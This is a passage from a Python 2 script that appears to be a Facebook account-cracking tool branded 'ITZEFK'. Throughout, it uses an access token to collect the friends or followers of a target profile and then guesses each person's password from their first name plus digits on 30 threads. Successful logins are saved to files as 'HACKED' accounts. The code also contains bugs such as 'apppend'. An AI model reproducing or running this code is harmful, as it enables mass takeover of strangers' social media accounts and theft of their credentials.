                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[ITZEFK-HACKED \xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass6
                                    cp = open('ITZEFK_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[1;92mCrack Done'
    print '\x1b[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input('\x1b[1;93m Press enter to back')
    choice_crack()


def crack_b():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;93m~~~~ NAME + DIGIT PASS CRACKING ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    a_s()


def name_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;93m~~~~ NAME + DIGIT PASS CRACKING ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    n_s()


def n_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;93m Select One : ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;93m~~~~ NAME + DIGIT PASS PUBLIC CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;91mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;93m~~~~NAME PASS PUBLIC CRACKING~~~~'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' \x1b[1;92mPress enter to try again ')
            name_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;93m~~~~ NAME PASS FOLLOWERS CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        print ' \x1b[1;91mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[5]Password: ')
        pass7 = raw_input(' \x1b[1;92m[5]Password: ')
        pass8 = raw_input(' \x1b[1;92m[5]Password: ')
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;93m~~~~ NAME PASS FOLLOWERS CRACKING ~~~~'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('\x1b[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;93m~~~~ NAME + DIGIT PASS FILE CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;91mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
        try:
            idlist = raw_input(' \x1b[1;96m[\xe2\x98\x85] File Name:  ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        a_s()
    print ' \x1b[1;93mTotal ids: \x1b[1;96m ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;91mCrack Running\x1b[1;91m '
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92mWE ARE MAKING SYSTEM\x1b[1;91m'
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[ITZEFK-HACKED \xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass1
                cp = open('ITZEFK_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[ITZEFK-HACKED \xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass2
                    cp = open('ITZEFK_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[ITZEFK-HACKED \xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass3
                        cp = open('ITZEFK_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[ITZEFK-HACKED \xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass4
                            cp = open('ITZEFK_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[ITZEFK-HACKED \xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass5
                                cp = open('ITZEFK_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[ITZEFK-HACKED \xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass6
                                    cp = open('ITZEFK_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[ITZEFK-HACKED \xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass7
                                        cp = open('ITZEFK_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[ITZEFK-HACKED \xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass8
                                            cp = open('ITZEFK_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[1;92mCrack Done'
    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input(' \x1b[1;93mPress enter to back')
    auto_crack()


def crack_b():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1m~~~~ NAME+DIGIT AND DIGIT PASS ~~~~'
    print ''
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    print ''
    a_s()


def digit_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1m~~~~ NAME+DIGIT AND DIGIT CRACKING ~~~~'
    print ''
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    print ''
    a_s()


def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;93mSelect One: ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;31;1m~~~~ NAME+DIGIT AND DIGIT PUBLIC CRACKING ~~~~'
        print ''
        print '\x1b[1;93m For example: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        p5 = raw_input(' \x1b[1;92m[5]Name + digit: ')
        p6 = raw_input(' \x1b[1;92m[6]Name + digit: ')
        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
        pass9 = raw_input(' \x1b[1;92m[9]Password: ')
        pass10 = raw_input(' \x1b[1;92m[10]Password: ')
        pass11 = raw_input(' \x1b[1;92m[11]Password: ')
        pass12 = raw_input(' \x1b[1;92m[12]Password: ')
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;31;1m~~~~NAME+DIGIT AND DIGIT PUBLIC CRACKING~~~~'
            print ''
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input(' \x1b[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;31;1m~~~~ NAME+DIGIT AND DIGIT FOLLOWERS CRACKING ~~~~'
        print ''
        print ' \x1b[1;93mFor example: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        p5 = raw_input(' \x1b[1;92m[5]Name + digit: ')
        p6 = raw_input(' \x1b[1;92m[6]Name + digit: ')
        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
        pass9 = raw_input(' \x1b[1;92m[9]Password: ')
        pass10 = raw_input(' \x1b[1;92m[10]Password: ')
        pass11 = raw_input(' \x1b[1;92m[11]Password: ')
        pass12 = raw_input(' \x1b[1;92m[12]Password: ')
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;31;1m~~~~ NAME+DIGIT AND DIGIT FOLLOWERS CRACKING ~~~~'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input('\x1b[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;31;1m~~~~ NAME+DIGIT AND DIGIT FILE CRACKING ~~~~'
        print ''
        print '\x1b[1;93m For example: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        p5 = raw_input(' \x1b[1;92m[5]Name + digit: ')
        p6 = raw_input(' \x1b[1;92m[6]Name + digit: ')
        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
        pass9 = raw_input(' \x1b[1;92m[9]Password: ')
        pass10 = raw_input(' \x1b[1;92m[10]Password: ')
        pass11 = raw_input(' \x1b[1;92m[11]Password: ')
        pass12 = raw_input(' \x1b[1;92m[12]Password: ')
        try:
            idlist = raw_input('[+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        print ''
        a_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;93mCrack Running '
    time.sleep(0.5)
    print ''
    print 46 * '-'
    print ''
    print ' \x1b[1;92WE ARE MAKING SYSTEM'
    print ''
    print 46 * '-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass1
                cp = open('ITZEFK_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/ITZEFKS_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass2
                    cp = open('ITZEFK_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass3
                        cp = open('ITZEFK_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[JITZEFK-CP] ' + uid + ' | ' + pass4
                            cp = open('ITZEFK_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = name.lower() + p5
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass5
                                cp = open('ITZEFK_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                pass6 = name.lower() + p6
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass6
                                    cp = open('ITZEFK_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass7
                                        cp = open('ITZEFK_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass8
                                            cp = open('ITZEFK_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
                                        else:
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass9
                                                cp = open('ITZEFK_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass9)
                                            else:
                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass10
                                                    cp = open('ITZEFK_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass10)
                                                else:
                                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass11, headers=header).text
                                                    q = json.loads(data)
                                                    if 'loc' in q:
                                                        print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass11 + '\x1b[0;97m'
                                                        ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                                        ok.write(uid + ' | ' + pass11 + '\n')
                                                        ok.close()
                                                        oks.append(uid + pass11)
                                                    elif 'www.facebook.com' in q['error']:
                                                        print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass11
                                                        cp = open('ITZEFK_CP.txt', 'a')
                                                        cp.write(uid + ' | ' + pass11 + '\n')
                                                        cp.close()
                                                        cps.apppend(uid + pass11)
                                                    else:
                                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass12, headers=header).text
                                                        q = json.loads(data)
                                                        if 'loc' in q:
                                                            print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass12 + '\x1b[0;97m'
                                                            ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                                            ok.write(uid + ' | ' + pass12 + '\n')
                                                            ok.close()
                                                            oks.append(uid + pass12)
                                                        elif 'www.facebook.com' in q['error']:
                                                            print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass12
                                                            cp = open('ITZEFK_CP.txt', 'a')
                                                            cp.write(uid + ' | ' + pass12 + '\n')
                                                            cp.close()
                                                            cps.apppend(uid + pass12)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' \x1b[1;92mCrack Done'
    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' \x1b[1;93mPress enter to back')
    auto_crack()


def ex_id_flo():
    global token
    idg = []
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print '\t\x1b[1;91mToken not found'
        print ''
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print '\t\x1b[1;92mCreating File From Flower'
    print ''
    idh = raw_input('\x1b[1;93m Enter Id: ')
    limit = raw_input('[+] Limit [Max 3000] : ')
    try:
        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers=header)
        q = json.loads(r.text)
        print ' Collecting From: ' + q['name']
    except KeyError:
